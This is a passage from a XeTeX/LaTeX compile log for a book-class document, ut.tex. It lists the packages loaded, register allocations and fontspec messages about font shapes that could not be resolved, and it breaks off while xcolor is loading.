This is XeTeX, Version 3.141592653-2.6-0.999995 (TeX Live 2023) (preloaded format=xelatex 2023.8.26)  31 AUG 2026 18:49
entering extended mode
 restricted \write18 enabled.
 %&-line parsing enabled.
**ut.tex
(./ut.tex
LaTeX2e <2023-06-01> patch level 1
L3 programming layer <2023-08-11>
(c:/texlive/2023/texmf-dist/tex/latex/base/book.cls
Document Class: book 2023/05/17 v1.4n Standard LaTeX document class
(c:/texlive/2023/texmf-dist/tex/latex/base/bk10.clo
File: bk10.clo 2023/05/17 v1.4n Standard LaTeX file (size option)
)
\c@part=\count181
\c@chapter=\count182
\c@section=\count183
\c@subsection=\count184
\c@subsubsection=\count185
\c@paragraph=\count186
\c@subparagraph=\count187
\c@figure=\count188
\c@table=\count189
\abovecaptionskip=\skip48
\belowcaptionskip=\skip49
\bibindent=\dimen140
)
(c:/texlive/2023/texmf-dist/tex/latex/geometry/geometry.sty
Package: geometry 2020/01/02 v5.9 Page Geometry

(c:/texlive/2023/texmf-dist/tex/latex/graphics/keyval.sty
Package: keyval 2022/05/29 v1.15 key=value parser (DPC)
\KV@toks@=\toks17
)
(c:/texlive/2023/texmf-dist/tex/generic/iftex/ifvtex.sty
Package: ifvtex 2019/10/25 v1.7 ifvtex legacy package. Use iftex instead.

(c:/texlive/2023/texmf-dist/tex/generic/iftex/iftex.sty
Package: iftex 2022/02/03 v1.0f TeX engine tests
))
\Gm@cnth=\count190
\Gm@cntv=\count191
\c@Gm@tempcnt=\count192
\Gm@bindingoffset=\dimen141
\Gm@wd@mp=\dimen142
\Gm@odd@mp=\dimen143
\Gm@even@mp=\dimen144
\Gm@layoutwidth=\dimen145
\Gm@layoutheight=\dimen146
\Gm@layouthoffset=\dimen147
\Gm@layoutvoffset=\dimen148
\Gm@dimlist=\toks18
)
(c:/texlive/2023/texmf-dist/tex/latex/fontspec/fontspec.sty
(c:/texlive/2023/texmf-dist/tex/latex/l3packages/xparse/xparse.sty
(c:/texlive/2023/texmf-dist/tex/latex/l3kernel/expl3.sty
Package: expl3 2023-08-11 L3 programming layer (loader) 

(c:/texlive/2023/texmf-dist/tex/latex/l3backend/l3backend-xetex.def
File: l3backend-xetex.def 2023-04-19 L3 backend support: XeTeX
\g__graphics_track_int=\count193
\l__pdf_internal_box=\box51
\g__pdf_backend_object_int=\count194
\g__pdf_backend_annotation_int=\count195
\g__pdf_backend_link_int=\count196
))
Package: xparse 2023-02-02 L3 Experimental document command parser
)
Package: fontspec 2022/01/15 v2.8a Font selection for XeLaTeX and LuaLaTeX

(c:/texlive/2023/texmf-dist/tex/latex/fontspec/fontspec-xetex.sty
Package: fontspec-xetex 2022/01/15 v2.8a Font selection for XeLaTeX and LuaLaTe
X
\l__fontspec_script_int=\count197
\l__fontspec_language_int=\count198
\l__fontspec_strnum_int=\count199
\l__fontspec_tmp_int=\count266
\l__fontspec_tmpa_int=\count267
\l__fontspec_tmpb_int=\count268
\l__fontspec_tmpc_int=\count269
\l__fontspec_em_int=\count270
\l__fontspec_emdef_int=\count271
\l__fontspec_strong_int=\count272
\l__fontspec_strongdef_int=\count273
\l__fontspec_tmpa_dim=\dimen149
\l__fontspec_tmpb_dim=\dimen150
\l__fontspec_tmpc_dim=\dimen151

(c:/texlive/2023/texmf-dist/tex/latex/base/fontenc.sty
Package: fontenc 2021/04/29 v2.0v Standard LaTeX package
)
(c:/texlive/2023/texmf-dist/tex/latex/fontspec/fontspec.cfg)))
(c:/texlive/2023/texmf-dist/tex/latex/titlesec/titlesec.sty
Package: titlesec 2021/07/05 v2.14 Sectioning titles
\ttl@box=\box52
\beforetitleunit=\skip50
\aftertitleunit=\skip51
\ttl@plus=\dimen152
\ttl@minus=\dimen153
\ttl@toksa=\toks19
\titlewidth=\dimen154
\titlewidthlast=\dimen155
\titlewidthfirst=\dimen156
)
(c:/texlive/2023/texmf-dist/tex/latex/imakeidx/imakeidx.sty
Package: imakeidx 2016/10/15 v1.3e Package for typesetting indices in a synchro
nous mode

(c:/texlive/2023/texmf-dist/tex/latex/xkeyval/xkeyval.sty
Package: xkeyval 2022/06/16 v2.9 package option processing (HA)

(c:/texlive/2023/texmf-dist/tex/generic/xkeyval/xkeyval.tex
(c:/texlive/2023/texmf-dist/tex/generic/xkeyval/xkvutils.tex
\XKV@toks=\toks20
\XKV@tempa@toks=\toks21
)
\XKV@depth=\count274
File: xkeyval.tex 2014/12/03 v2.7a key=value parser (HA)
))
(c:/texlive/2023/texmf-dist/tex/generic/iftex/ifxetex.sty
Package: ifxetex 2019/10/25 v0.7 ifxetex legacy package. Use iftex instead.
)
(c:/texlive/2023/texmf-dist/tex/generic/iftex/ifluatex.sty
Package: ifluatex 2019/10/25 v1.5 ifluatex legacy package. Use iftex instead.
)
(c:/texlive/2023/texmf-dist/tex/latex/tools/multicol.sty
Package: multicol 2023/03/30 v1.9f multicolumn formatting (FMi)
\c@tracingmulticols=\count275
\mult@box=\box53
\multicol@leftmargin=\dimen157
\c@unbalance=\count276
\c@collectmore=\count277
\doublecol@number=\count278
\multicoltolerance=\count279
\multicolpretolerance=\count280
\full@width=\dimen158
\page@free=\dimen159
\premulticols=\dimen160
\postmulticols=\dimen161
\multicolsep=\skip52
\multicolbaselineskip=\skip53
\partial@page=\box54
\last@line=\box55
\mc@boxedresult=\box56
\maxbalancingoverflow=\dimen162
\mult@rightbox=\box57
\mult@grightbox=\box58
\mult@firstbox=\box59
\mult@gfirstbox=\box60
\@tempa=\box61
\@tempa=\box62
\@tempa=\box63
\@tempa=\box64
\@tempa=\box65
\@tempa=\box66
\@tempa=\box67
\@tempa=\box68
\@tempa=\box69
\@tempa=\box70
\@tempa=\box71
\@tempa=\box72
\@tempa=\box73
\@tempa=\box74
\@tempa=\box75
\@tempa=\box76
\@tempa=\box77
\@tempa=\box78
\@tempa=\box79
\@tempa=\box80
\@tempa=\box81
\@tempa=\box82
\@tempa=\box83
\@tempa=\box84
\@tempa=\box85
\@tempa=\box86
\@tempa=\box87
\@tempa=\box88
\@tempa=\box89
\@tempa=\box90
\@tempa=\box91
\@tempa=\box92
\@tempa=\box93
\@tempa=\box94
\@tempa=\box95
\@tempa=\box96
\c@minrows=\count281
\c@columnbadness=\count282
\c@finalcolumnbadness=\count283
\last@try=\dimen163
\multicolovershoot=\dimen164
\multicolundershoot=\dimen165
\mult@nat@firstbox=\box97
\colbreak@box=\box98
\mc@col@check@num=\count284
))
\ut@idxfile=\write3
\openout3 = `ut.idx'.


Writing index file ut.idx

Package fontspec Info: Could not resolve font "InfoOTDisp/BI" (it probably
(fontspec)             doesn't exist).


Package fontspec Info: Could not resolve font "InfoOTDisp/B" (it probably
(fontspec)             doesn't exist).


Package fontspec Info: Could not resolve font "InfoOTDisp/I" (it probably
(fontspec)             doesn't exist).


Package fontspec Info: Font family 'InfoOTDisp(0)' created for font
(fontspec)             'InfoOTDisp' with options [Ligatures=TeX].
(fontspec)              
(fontspec)              This font family consists of the following NFSS
(fontspec)             series/shapes:
(fontspec)              
(fontspec)             - 'normal' (m/n) with NFSS spec.:
(fontspec)             <->"InfoOTDisp/OT:script=latn;language=dflt;mapping=tex-
text;"
(fontspec)             - 'small caps'  (m/sc) with NFSS spec.: 


Package fontspec Info: Font family 'CourierNew(0)' created for font 'Courier
(fontspec)             New' with options
(fontspec)             [WordSpace={1,0,0},HyphenChar=None,PunctuationSpace=Word
Space,Scale=1.0].
(fontspec)              
(fontspec)              This font family consists of the following NFSS
(fontspec)             series/shapes:
(fontspec)              
(fontspec)             - 'normal' (m/n) with NFSS spec.: <->s*[1.0]"Courier
(fontspec)             New/OT:script=latn;language=dflt;"
(fontspec)             - 'small caps'  (m/sc) with NFSS spec.: 
(fontspec)             and font adjustment code:
(fontspec)             \fontdimen 2\font =1\fontdimen 2\font \fontdimen 3\font
(fontspec)             =0\fontdimen 3\font \fontdimen 4\font =0\fontdimen
(fontspec)             4\font \fontdimen 7\font =0\fontdimen 2\font
(fontspec)             \tex_hyphenchar:D \font =-1\scan_stop: 
(fontspec)             - 'bold' (b/n) with NFSS spec.: <->s*[1.0]"Courier
(fontspec)             New/B/OT:script=latn;language=dflt;"
(fontspec)             - 'bold small caps'  (b/sc) with NFSS spec.: 
(fontspec)             and font adjustment code:
(fontspec)             \fontdimen 2\font =1\fontdimen 2\font \fontdimen 3\font
(fontspec)             =0\fontdimen 3\font \fontdimen 4\font =0\fontdimen
(fontspec)             4\font \fontdimen 7\font =0\fontdimen 2\font
(fontspec)             \tex_hyphenchar:D \font =-1\scan_stop: 
(fontspec)             - 'italic' (m/it) with NFSS spec.: <->s*[1.0]"Courier
(fontspec)             New/I/OT:script=latn;language=dflt;"
(fontspec)             - 'italic small caps'  (m/scit) with NFSS spec.: 
(fontspec)             and font adjustment code:
(fontspec)             \fontdimen 2\font =1\fontdimen 2\font \fontdimen 3\font
(fontspec)             =0\fontdimen 3\font \fontdimen 4\font =0\fontdimen
(fontspec)             4\font \fontdimen 7\font =0\fontdimen 2\font
(fontspec)             \tex_hyphenchar:D \font =-1\scan_stop: 
(fontspec)             - 'bold italic' (b/it) with NFSS spec.:
(fontspec)             <->s*[1.0]"Courier
(fontspec)             New/BI/OT:script=latn;language=dflt;"
(fontspec)             - 'bold italic small caps'  (b/scit) with NFSS spec.: 
(fontspec)             and font adjustment code:
(fontspec)             \fontdimen 2\font =1\fontdimen 2\font \fontdimen 3\font
(fontspec)             =0\fontdimen 3\font \fontdimen 4\font =0\fontdimen
(fontspec)             4\font \fontdimen 7\font =0\fontdimen 2\font
(fontspec)             \tex_hyphenchar:D \font =-1\scan_stop: 


Package fontspec Info: Could not resolve font "Eurostile W01/BI" (it probably
(fontspec)             doesn't exist).


Package fontspec Info: Could not resolve font "Eurostile W01/B" (it probably
(fontspec)             doesn't exist).


Package fontspec Info: Could not resolve font "Eurostile W01/I" (it probably
(fontspec)             doesn't exist).


Package fontspec Info: Font family 'EurostileW01(0)' created for font
(fontspec)             'Eurostile W01' with options [].
(fontspec)              
(fontspec)              This font family consists of the following NFSS
(fontspec)             series/shapes:
(fontspec)              
(fontspec)             - 'normal' (m/n) with NFSS spec.: <->"Eurostile
(fontspec)             W01/OT:script=latn;language=dflt;"
(fontspec)             - 'small caps'  (m/sc) with NFSS spec.: 


Package fontspec Info: Could not resolve font "Eurostile Extd/BI" (it probably
(fontspec)             doesn't exist).


Package fontspec Info: Could not resolve font "Eurostile Extd/B" (it probably
(fontspec)             doesn't exist).


Package fontspec Info: Could not resolve font "Eurostile Extd/I" (it probably
(fontspec)             doesn't exist).


Package fontspec Info: Font family 'EurostileExtd(0)' created for font
(fontspec)             'Eurostile Extd' with options [].
(fontspec)              
(fontspec)              This font family consists of the following NFSS
(fontspec)             series/shapes:
(fontspec)              
(fontspec)             - 'normal' (m/n) with NFSS spec.: <->"Eurostile
(fontspec)             Extd/OT:script=latn;language=dflt;"
(fontspec)             - 'small caps'  (m/sc) with NFSS spec.: 

(c:/texlive/2023/texmf-dist/tex/latex/microtype/microtype.sty
Package: microtype 2023/03/13 v3.1a Micro-typographical refinements (RS)

(c:/texlive/2023/texmf-dist/tex/latex/etoolbox/etoolbox.sty
Package: etoolbox 2020/10/05 v2.5k e-TeX tools for LaTeX (JAW)
\etb@tempcnta=\count285
)
\MT@toks=\toks22
\MT@tempbox=\box99
\MT@count=\count286
LaTeX Info: Redefining \noprotrusionifhmode on input line 1059.
LaTeX Info: Redefining \leftprotrusion on input line 1060.
\MT@prot@toks=\toks23
LaTeX Info: Redefining \rightprotrusion on input line 1078.
LaTeX Info: Redefining \textls on input line 1368.
\MT@outer@kern=\dimen166
LaTeX Info: Redefining \textmicrotypecontext on input line 1988.
\MT@listname@count=\count287

(c:/texlive/2023/texmf-dist/tex/latex/microtype/microtype-xetex.def
File: microtype-xetex.def 2023/03/13 v3.1a Definitions specific to xetex (RS)
LaTeX Info: Redefining \lsstyle on input line 238.
)
Package microtype Info: Loading configuration file microtype.cfg.

(c:/texlive/2023/texmf-dist/tex/latex/microtype/microtype.cfg
File: microtype.cfg 2023/03/13 v3.1a microtype main configuration file (RS)
))
(c:/texlive/2023/texmf-dist/tex/latex/seqsplit/seqsplit.sty
Package: seqsplit 2006/08/07 v0.1 Splitting long sequences (DNA, RNA, proteins,
 etc.) 
)
(c:/texlive/2023/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty
Package: fancyhdr 2022/11/09 v4.1 Extensive control of page headers and footers

\f@nch@headwidth=\skip54
\f@nch@O@elh=\skip55
\f@nch@O@erh=\skip56
\f@nch@O@olh=\skip57
\f@nch@O@orh=\skip58
\f@nch@O@elf=\skip59
\f@nch@O@erf=\skip60
\f@nch@O@olf=\skip61
\f@nch@O@orf=\skip62
)
(c:/texlive/2023/texmf-dist/tex/latex/float/float.sty
Package: float 2001/11/08 v1.3d Float enhancements (AL)
\c@float@type=\count288
\float@exts=\toks24
\float@box=\box100
\@float@everytoks=\toks25
\@floatcapt=\box101
)
(c:/texlive/2023/texmf-dist/tex/latex/endnotes/endnotes.sty
Invalid UTF-8 byte or sequence at line 118 replaced by U+FFFD.
Invalid UTF-8 byte or sequence at line 118 replaced by U+FFFD.
Invalid UTF-8 byte or sequence at line 121 replaced by U+FFFD.
Invalid UTF-8 byte or sequence at line 121 replaced by U+FFFD.
Package: endnotes 2020-01-02 endnotes package
\c@endnote=\count289
\endnotesep=\dimen167
\@enotes=\write4
)
\c@endnotechapter=\count290

(c:/texlive/2023/texmf-dist/tex/latex/graphics/rotating.sty
Package: rotating 2016/08/11 v2.16d rotated objects in LaTeX

(c:/texlive/2023/texmf-dist/tex/latex/graphics/graphicx.sty
Package: graphicx 2021/09/16 v1.2d Enhanced LaTeX Graphics (DPC,SPQR)

(c:/texlive/2023/texmf-dist/tex/latex/graphics/graphics.sty
Package: graphics 2022/03/10 v1.4e Standard LaTeX Graphics (DPC,SPQR)

(c:/texlive/2023/texmf-dist/tex/latex/graphics/trig.sty
Package: trig 2021/08/11 v1.11 sin cos tan (DPC)
)
(c:/texlive/2023/texmf-dist/tex/latex/graphics-cfg/graphics.cfg
File: graphics.cfg 2016/06/04 v1.11 sample graphics configuration
)
Package graphics Info: Driver file: xetex.def on input line 107.

(c:/texlive/2023/texmf-dist/tex/latex/graphics-def/xetex.def
File: xetex.def 2022/09/22 v5.0n Graphics/color driver for xetex
))
\Gin@req@height=\dimen168
\Gin@req@width=\dimen169
)
(c:/texlive/2023/texmf-dist/tex/latex/base/ifthen.sty
Package: ifthen 2022/04/13 v1.1d Standard LaTeX ifthen package (DPC)
)
\c@r@tfl@t=\count291
\rotFPtop=\skip63
\rotFPbot=\skip64
\rot@float@box=\box102
\rot@mess@toks=\toks26
)
(c:/texlive/2023/texmf-dist/tex/latex/placeins/placeins.sty
Package: placeins 2005/04/18  v 2.2
)
(c:/texlive/2023/texmf-dist/tex/latex/amsmath/amsmath.sty
Package: amsmath 2023/05/13 v2.17o AMS math features
\@mathmargin=\skip65

For additional information on amsmath, use the `?' option.
(c:/texlive/2023/texmf-dist/tex/latex/amsmath/amstext.sty
Package: amstext 2021/08/26 v2.01 AMS text

(c:/texlive/2023/texmf-dist/tex/latex/amsmath/amsgen.sty
File: amsgen.sty 1999/11/30 v2.0 generic functions
\@emptytoks=\toks27
\ex@=\dimen170
))
(c:/texlive/2023/texmf-dist/tex/latex/amsmath/amsbsy.sty
Package: amsbsy 1999/11/29 v1.2d Bold Symbols
\pmbraise@=\dimen171
)
(c:/texlive/2023/texmf-dist/tex/latex/amsmath/amsopn.sty
Package: amsopn 2022/04/08 v2.04 operator names
)
\inf@bad=\count292
LaTeX Info: Redefining \frac on input line 234.
\uproot@=\count293
\leftroot@=\count294
LaTeX Info: Redefining \overline on input line 399.
LaTeX Info: Redefining \colon on input line 410.
\classnum@=\count295
\DOTSCASE@=\count296
LaTeX Info: Redefining \ldots on input line 496.
LaTeX Info: Redefining \dots on input line 499.
LaTeX Info: Redefining \cdots on input line 620.
\Mathstrutbox@=\box103
\strutbox@=\box104
LaTeX Info: Redefining \big on input line 722.
LaTeX Info: Redefining \Big on input line 723.
LaTeX Info: Redefining \bigg on input line 724.
LaTeX Info: Redefining \Bigg on input line 725.
\big@size=\dimen172
LaTeX Font Info:    Redeclaring font encoding OML on input line 743.
LaTeX Font Info:    Redeclaring font encoding OMS on input line 744.
\macc@depth=\count297
LaTeX Info: Redefining \bmod on input line 905.
LaTeX Info: Redefining \pmod on input line 910.
LaTeX Info: Redefining \smash on input line 940.
LaTeX Info: Redefining \relbar on input line 970.
LaTeX Info: Redefining \Relbar on input line 971.
\c@MaxMatrixCols=\count298
\dotsspace@=\muskip16
\c@parentequation=\count299
\dspbrk@lvl=\count300
\tag@help=\toks28
\row@=\count301
\column@=\count302
\maxfields@=\count303
\andhelp@=\toks29
\eqnshift@=\dimen173
\alignsep@=\dimen174
\tagshift@=\dimen175
\tagwidth@=\dimen176
\totwidth@=\dimen177
\lineht@=\dimen178
\@envbody=\toks30
\multlinegap=\skip66
\multlinetaggap=\skip67
\mathdisplay@stack=\toks31
LaTeX Info: Redefining \[ on input line 2953.
LaTeX Info: Redefining \] on input line 2954.
)
(c:/texlive/2023/texmf-dist/tex/latex/glossaries/base/glossaries.sty
Package: glossaries 2022/11/03 v4.52 (NLCT)

(c:/texlive/2023/texmf-dist/tex/latex/mfirstuc/mfirstuc.sty
Package: mfirstuc 2022/10/14 v2.08 (NLCT)
\@glsmfirst=\toks32
\@glsmrest=\toks33
)
(c:/texlive/2023/texmf-dist/tex/latex/xfor/xfor.sty
Package: xfor 2009/02/05 v1.05 (NLCT)
)
(c:/texlive/2023/texmf-dist/tex/latex/datatool/datatool-base.sty
Package: datatool-base 2019/09/27 v2.32 (NLCT)

(c:/texlive/2023/texmf-dist/tex/latex/substr/substr.sty
Package: substr 2009/10/20 v1.2 Handle substrings
\c@su@anzahl=\count304
)
(c:/texlive/2023/texmf-dist/tex/latex/datatool/datatool-fp.sty
Package: datatool-fp 2019/09/27 v2.32 (NLCT)

(c:/texlive/2023/texmf-dist/tex/latex/fp/fp.sty
Package: fp 1995/04/02

`Fixed Point Package', Version 0.8, April 2, 1995 (C) Michael Mehlich
(c:/texlive/2023/texmf-dist/tex/latex/fp/defpattern.sty
Package: defpattern 1994/10/12
\actioncount=\count305
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-basic.sty
Package: fp-basic 1996/05/13
\FP@xs=\count306
\FP@xia=\count307
\FP@xib=\count308
\FP@xfa=\count309
\FP@xfb=\count310
\FP@rega=\count311
\FP@regb=\count312
\FP@regs=\count313
\FP@times=\count314
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-addons.sty
Package: fp-addons 1995/03/15
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-snap.sty
Package: fp-snap 1995/04/05
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-exp.sty
Package: fp-exp 1995/04/03
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-trigo.sty
Package: fp-trigo 1995/04/14
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-pas.sty
Package: fp-pas 1994/08/29
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-random.sty
Package: fp-random 1995/02/23
\FPseed=\count315
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-eqn.sty
Package: fp-eqn 1995/04/03
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-upn.sty
Package: fp-upn 1996/10/21
)
(c:/texlive/2023/texmf-dist/tex/latex/fp/fp-eval.sty
Package: fp-eval 1995/04/03
)))
\@dtl@toks=\toks34
\@dtl@tmpcount=\count316
\dtl@tmplength=\skip68
\dtl@sortresult=\count317
\@dtl@numgrpsepcount=\count318
\@dtl@datatype=\count319
\dtl@codeA=\count320
\dtl@codeB=\count321
\@dtl@foreach@level=\count322
)
\gls@level=\count323
\@gls@tmpb=\toks35
\gls@tmplen=\skip69
\glskeylisttok=\toks36
\glslabeltok=\toks37
\glsshorttok=\toks38
\glslongtok=\toks39

(c:/texlive/2023/texmf-dist/tex/latex/glossaries/styles/glossary-hypernav.sty
Package: glossary-hypernav 2022/11/03 v4.52 (NLCT)
)
(c:/texlive/2023/texmf-dist/tex/latex/glossaries/styles/glossary-list.sty
Package: glossary-list 2022/11/03 v4.52 (NLCT)
\glslistdottedwidth=\skip70
)
(c:/texlive/2023/texmf-dist/tex/latex/glossaries/styles/glossary-long.sty
Package: glossary-long 2022/11/03 v4.52 (NLCT)

(c:/texlive/2023/texmf-dist/tex/latex/tools/longtable.sty
Package: longtable 2021-09-01 v4.17 Multi-page Table package (DPC)
\LTleft=\skip71
\LTright=\skip72
\LTpre=\skip73
\LTpost=\skip74
\LTchunksize=\count324
\LTcapwidth=\dimen179
\LT@head=\box105
\LT@firsthead=\box106
\LT@foot=\box107
\LT@lastfoot=\box108
\LT@gbox=\box109
\LT@cols=\count325
\LT@rows=\count326
\c@LT@tables=\count327
\c@LT@chunks=\count328
\LT@p@ftn=\toks40
)
\glsdescwidth=\skip75
\glspagelistwidth=\skip76
)
(c:/texlive/2023/texmf-dist/tex/latex/glossaries/styles/glossary-super.sty
Package: glossary-super 2022/11/03 v4.52 (NLCT)

(c:/texlive/2023/texmf-dist/tex/latex/supertabular/supertabular.sty
Package: supertabular 2020/02/02 v4.1g the supertabular environment
\c@tracingst=\count329
\ST@wd=\dimen180
\ST@rightskip=\skip77
\ST@leftskip=\skip78
\ST@parfillskip=\skip79
\ST@pageleft=\dimen181
\ST@headht=\dimen182
\ST@tailht=\dimen183
\ST@pagesofar=\dimen184
\ST@pboxht=\dimen185
\ST@lineht=\dimen186
\ST@prevht=\dimen187
\ST@toadd=\dimen188
\ST@dimen=\dimen189
\ST@pbox=\box110
))
(c:/texlive/2023/texmf-dist/tex/latex/glossaries/styles/glossary-tree.sty
Package: glossary-tree 2022/11/03 v4.52 (NLCT)
\glstreeindent=\skip80
))
\glswrite=\write5
\glo@main@file=\write6
\openout6 = `ut.glo'.

Package glossaries Info: Writing glossary file ut.glo on input line 115.

(./glossary.tex) (c:/texlive/2023/texmf-dist/tex/latex/hyperref/hyperref.sty
Package: hyperref 2023-07-08 v7.01b Hypertext links for LaTeX

(c:/texlive/2023/texmf-dist/tex/generic/ltxcmds/ltxcmds.sty
Package: ltxcmds 2020-05-10 v1.25 LaTeX kernel commands for general use (HO)
)
(c:/texlive/2023/texmf-dist/tex/generic/pdftexcmds/pdftexcmds.sty
Package: pdftexcmds 2020-06-27 v0.33 Utility functions of pdfTeX for LuaTeX (HO
)

(c:/texlive/2023/texmf-dist/tex/generic/infwarerr/infwarerr.sty
Package: infwarerr 2019/12/03 v1.5 Providing info/warning/error messages (HO)
)
Package pdftexcmds Info: \pdf@primitive is available.
Package pdftexcmds Info: \pdf@ifprimitive is available.
Package pdftexcmds Info: \pdfdraftmode not found.
)
(c:/texlive/2023/texmf-dist/tex/latex/kvsetkeys/kvsetkeys.sty
Package: kvsetkeys 2022-10-05 v1.19 Key value parser (HO)
)
(c:/texlive/2023/texmf-dist/tex/generic/kvdefinekeys/kvdefinekeys.sty
Package: kvdefinekeys 2019-12-19 v1.6 Define keys (HO)
)
(c:/texlive/2023/texmf-dist/tex/generic/pdfescape/pdfescape.sty
Package: pdfescape 2019/12/09 v1.15 Implements pdfTeX's escape features (HO)
)
(c:/texlive/2023/texmf-dist/tex/latex/hycolor/hycolor.sty
Package: hycolor 2020-01-27 v1.10 Color options for hyperref/bookmark (HO)
)
(c:/texlive/2023/texmf-dist/tex/latex/letltxmacro/letltxmacro.sty
Package: letltxmacro 2019/12/03 v1.6 Let assignment for LaTeX macros (HO)
)
(c:/texlive/2023/texmf-dist/tex/latex/auxhook/auxhook.sty
Package: auxhook 2019-12-17 v1.6 Hooks for auxiliary files (HO)
)
(c:/texlive/2023/texmf-dist/tex/latex/hyperref/nameref.sty
Package: nameref 2023-08-07 v2.53 Cross-referencing by name of section

(c:/texlive/2023/texmf-dist/tex/latex/refcount/refcount.sty
Package: refcount 2019/12/15 v3.6 Data extraction from label references (HO)
)
(c:/texlive/2023/texmf-dist/tex/generic/gettitlestring/gettitlestring.sty
Package: gettitlestring 2019/12/15 v1.6 Cleanup title references (HO)

(c:/texlive/2023/texmf-dist/tex/latex/kvoptions/kvoptions.sty
Package: kvoptions 2022-06-15 v3.15 Key value format for package options (HO)
))
\c@section@level=\count330
)
\@linkdim=\dimen190
\Hy@linkcounter=\count331
\Hy@pagecounter=\count332

(c:/texlive/2023/texmf-dist/tex/latex/hyperref/pd1enc.def
File: pd1enc.def 2023-07-08 v7.01b Hyperref: PDFDocEncoding definition (HO)
)
(c:/texlive/2023/texmf-dist/tex/generic/intcalc/intcalc.sty
Package: intcalc 2019/12/15 v1.3 Expandable calculations with integers (HO)
)
\Hy@SavedSpaceFactor=\count333

(c:/texlive/2023/texmf-dist/tex/latex/hyperref/puenc.def
File: puenc.def 2023-07-08 v7.01b Hyperref: PDF Unicode definition (HO)
)
Package hyperref Info: Option `colorlinks' set `true' on input line 4050.
Package hyperref Info: Hyper figures OFF on input line 4167.
Package hyperref Info: Link nesting OFF on input line 4172.
Package hyperref Info: Hyper index ON on input line 4175.
Package hyperref Info: Plain pages OFF on input line 4182.
Package hyperref Info: Backreferencing OFF on input line 4187.
Package hyperref Info: Implicit mode ON; LaTeX internals redefined.
Package hyperref Info: Bookmarks ON on input line 4434.
\c@Hy@tempcnt=\count334

(c:/texlive/2023/texmf-dist/tex/latex/url/url.sty
\Urlmuskip=\muskip17
Package: url 2013/09/16  ver 3.4  Verb mode for urls, etc.
)
LaTeX Info: Redefining \url on input line 4772.
\XeTeXLinkMargin=\dimen191

(c:/texlive/2023/texmf-dist/tex/generic/bitset/bitset.sty
Package: bitset 2019/12/09 v1.3 Handle bit-vector datatype (HO)

(c:/texlive/2023/texmf-dist/tex/generic/bigintcalc/bigintcalc.sty
Package: bigintcalc 2019/12/15 v1.5 Expandable calculations on big integers (HO
)
))
\Fld@menulength=\count335
\Field@Width=\dimen192
\Fld@charsize=\dimen193
Package hyperref Info: Hyper figures OFF on input line 6051.
Package hyperref Info: Link nesting OFF on input line 6056.
Package hyperref Info: Hyper index ON on input line 6059.
Package hyperref Info: backreferencing OFF on input line 6066.
Package hyperref Info: Link coloring ON on input line 6069.
Package hyperref Info: Link coloring with OCG OFF on input line 6076.
Package hyperref Info: PDF/A mode OFF on input line 6081.

(c:/texlive/2023/texmf-dist/tex/latex/base/atbegshi-ltx.sty
Package: atbegshi-ltx 2021/01/10 v1.0c Emulation of the original atbegshi
package with kernel methods
)
\Hy@abspage=\count336
\c@Item=\count337
\c@Hfootnote=\count338
)
Package hyperref Info: Driver (autodetected): hxetex.

(c:/texlive/2023/texmf-dist/tex/latex/hyperref/hxetex.def
File: hxetex.def 2023-07-08 v7.01b Hyperref driver for XeTeX

(c:/texlive/2023/texmf-dist/tex/generic/stringenc/stringenc.sty
Package: stringenc 2019/11/29 v1.12 Convert strings between diff. encodings (HO
)
)
\pdfm@box=\box111
\c@Hy@AnnotLevel=\count339
\HyField@AnnotCount=\count340
\Fld@listcount=\count341
\c@bookmark@seq@number=\count342

(c:/texlive/2023/texmf-dist/tex/latex/rerunfilecheck/rerunfilecheck.sty
Package: rerunfilecheck 2022-07-10 v1.10 Rerun checks for auxiliary files (HO)

(c:/texlive/2023/texmf-dist/tex/latex/base/atveryend-ltx.sty
Package: atveryend-ltx 2020/08/19 v1.0a Emulation of the original atveryend pac
kage
with kernel methods
)
(c:/texlive/2023/texmf-dist/tex/generic/uniquecounter/uniquecounter.sty
Package: uniquecounter 2019/12/15 v1.4 Provide unlimited unique counter (HO)
)
Package uniquecounter Info: New unique counter `rerunfilecheck' on input line 2
85.
)
\Hy@SectionHShift=\skip81
)
(c:/texlive/2023/texmf-dist/tex/latex/xurl/xurl.sty
Package: xurl 2022/01/09 v 0.10 modify URL breaks
)
(c:/texlive/2023/texmf-dist/tex/latex/enumitem/enumitem.sty
Package: enumitem 2019/06/20 v3.9 Customized lists
\labelindent=\skip82
\enit@outerparindent=\dimen194
\enit@toks=\toks41
\enit@inbox=\box112
\enit@count@id=\count343
\enitdp@description=\count344
)
(c:/texlive/2023/texmf-dist/tex/latex/caption/caption.sty
Package: caption 2023/07/31 v3.6n Customizing captions (AR)

(c:/texlive/2023/texmf-dist/tex/latex/caption/caption3.sty
Package: caption3 2023/07/31 v2.4d caption3 kernel (AR)
\caption@tempdima=\dimen195
\captionmargin=\dimen196
\caption@leftmargin=\dimen197
\caption@rightmargin=\dimen198
\caption@width=\dimen199
\caption@indent=\dimen256
\caption@parindent=\dimen257
\caption@hangindent=\dimen258
Package caption Info: Standard document class detected.
)
\c@caption@flags=\count345
\c@continuedfloat=\count346
Package caption Info: float package is loaded.
Package caption Info: hyperref package is loaded.
Package caption Info: longtable package is loaded.

(c:/texlive/2023/texmf-dist/tex/latex/caption/ltcaption.sty
Package: ltcaption 2021/01/08 v1.4c longtable captions (AR)
)
Package caption Info: rotating package is loaded.
Package caption Info: supertabular package is loaded.
)
(c:/texlive/2023/texmf-dist/tex/latex/xcolor/xcolor.sty
Package: xcolor 2022/06/12 v2.14 LaTeX color extensions (UK)

(c:/texlive/2023/texmf-dist/tex/latex/graphics-cfg/color.cfg
File: color.cfg 2016/01/02 v1.6 sample color configuration
)
Package xcolor Info: Driver file: xetex.def on input line 227.

(c:/texlive/2023/texmf-dist/tex/latex/graphics/mathcolor.ltx)
Package xcolor Info: Model `cmy' substituted by `cmy0' on input line 1353.
Package xcolor Info: Model `RGB' extended on input line 1369.
Package xcolor Info: Model `HTML' substituted by `rgb' on input line 1371.
Package xcolor Info: Model `Hsb' substituted by `hsb' on input line 1372.
